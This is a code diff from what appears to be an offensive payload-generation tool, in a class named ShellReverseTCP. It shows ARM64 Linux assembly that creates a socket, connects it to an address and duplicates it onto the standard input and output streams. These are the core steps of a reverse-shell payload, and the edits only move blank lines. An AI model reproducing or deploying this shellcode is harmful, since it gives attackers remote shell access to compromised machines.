@@ -51,22 +51,24 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             mov x2, 0
             mov x8, 0xc6
             svc 0
-            mov x3, x0
 
+            mov x3, x0
             adr x1, sockaddr
             mov x2, 0x10
             mov x8, 0xcb
             svc 0
-            cbnz w0, exit
 
+            cbnz w0, exit
             mov x0, x3
             mov x2, 0
             mov x1, 0x0
             mov x8, 0x18
             svc 0
+
             mov x1, 0x1
             mov x8, 0x18
             svc 0
+
             mov x1, 0x2
             mov x8, 0x18
             svc 0
